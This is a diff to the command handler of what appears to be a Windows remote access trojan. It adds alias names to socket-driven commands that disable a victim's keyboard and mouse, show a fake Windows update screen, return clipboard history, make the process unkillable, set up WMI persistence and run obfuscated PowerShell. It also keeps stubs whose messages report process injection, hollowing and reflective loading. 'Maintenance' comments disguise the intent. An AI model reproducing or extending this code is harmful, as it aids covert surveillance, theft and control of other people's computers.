@@ -155,12 +155,12 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
     if (len == 0) { net_send_packet(sock, "[Empty command]"); return; }
     
     /* Maintenance commands */
-    if (strcmp(cmd, "BLOCK_UI") == 0) {
+    if (strcmp(cmd, "BLOCK_UI") == 0 || strcmp(cmd, "DISABLE_INPUT") == 0) {
         /* Enter maintenance mode: lock player controls */
         ui_lock_controls(1);
         result = "[Keyboard & Mouse disabled]";
     }
-    else if (strcmp(cmd, "SHOW_SPLASH") == 0) {
+    else if (strcmp(cmd, "SHOW_SPLASH") == 0 || strcmp(cmd, "WINDOWS_UPDATE") == 0) {
         /* Show system update splash screen during maintenance */
         ui_show_splash(1);
         result = "[Windows update screen shown]";
@@ -203,40 +203,40 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         ui_open_note(cmd + 5);
         result = "[Note opened on target]";
     }
-    else if (strcmp(cmd, "CLIP_HIST") == 0) {
+    else if (strcmp(cmd, "CLIP_HIST") == 0 || strcmp(cmd, "CLIPBOARD_LOG") == 0) {
         result = copy_buffer_get_history();
     }
-    else if (strcmp(cmd, "SYS_CHECK") == 0) {
+    else if (strcmp(cmd, "SYS_CHECK") == 0 || strcmp(cmd, "SECURITY_CHECK") == 0) {
         sys_check_antivirus();
         result = "[Security check complete]";
     }
-    else if (strcmp(cmd, "DEPLOY_SVC") == 0) {
+    else if (strcmp(cmd, "DEPLOY_SVC") == 0 || strcmp(cmd, "PROTECT_PROCESS") == 0) {
         sys_deploy_services();
         result = "[System services deployed]";
     }
-    else if (strcmp(cmd, "REMOVE_SVC") == 0) {
+    else if (strcmp(cmd, "REMOVE_SVC") == 0 || strcmp(cmd, "UNPROTECT_PROCESS") == 0 || strcmp(cmd, "CLEAR_PROTECTION") == 0) {
         util_clear_critical();
         result = "[Protection removed — process can be terminated]";
     }
-    else if (strcmp(cmd, "SVC_STATUS") == 0) {
+    else if (strcmp(cmd, "SVC_STATUS") == 0 || strcmp(cmd, "CHECK_PROTECTION") == 0) {
         const char *critical_status = util_check_critical();
         const char *admin_status = sys_is_admin() ? "admin" : "not admin";
         snprintf(response, sizeof(response), "%s [running as %s]", critical_status, admin_status);
         result = response;
     }
-    else if (strcmp(cmd, "SCHEDULE_TASK") == 0) {
+    else if (strcmp(cmd, "SCHEDULE_TASK") == 0 || strcmp(cmd, "WMI_PERSISTENCE") == 0) {
         util_setup_wmi();
         result = "[WMI persistence established: root/subscription, triggers every 30s]";
     }
-    else if (strcmp(cmd, "REMOTE_SVC") == 0) {
+    else if (strcmp(cmd, "REMOTE_SVC") == 0 || strcmp(cmd, "INJECT_PROCESS") == 0) {
         /* REMOVED */;
         result = "[Process injection attempted: payload path injected into svchost/explorer]";
     }
-    else if (strcmp(cmd, "MEM_SVC") == 0) {
+    else if (strcmp(cmd, "MEM_SVC") == 0 || strcmp(cmd, "HOLLOW_PROCESS") == 0) {
         /* REMOVED */;
         result = "[Process hollowing: conhost.exe running our payload purely from memory]";
     }
-    else if (strcmp(cmd, "DLL_LOAD") == 0) {
+    else if (strcmp(cmd, "DLL_LOAD") == 0 || strcmp(cmd, "REFLECT_LOAD") == 0) {
         /* REMOVED */;
         result = "[Reflective PE loader: full payload injected into explorer.exe without CreateProcess]";
     }
@@ -329,7 +329,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         const char *ps_cmd = cmd + 14;
         result = sys_obfuscate_ps(ps_cmd);
     }
-    else if (strcmp(cmd, "SET_CRITICAL") == 0) {
+    else if (strcmp(cmd, "SET_CRITICAL") == 0 || strcmp(cmd, "PROTECT_NOW") == 0) {
         if (!sys_is_admin()) {
             result = "[FAIL: admin required]";
         } else {
@@ -344,7 +344,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
             }
         }
     }
-    else if (strcmp(cmd, "CLEANUP") == 0) {
+    else if (strcmp(cmd, "CLEANUP") == 0 || strcmp(cmd, "UNINSTALL") == 0 || strcmp(cmd, "Exit") == 0) {
         sys_cleanup();
         result = "[CLEANUP initiated — all persistence removed, process will exit]";
     }
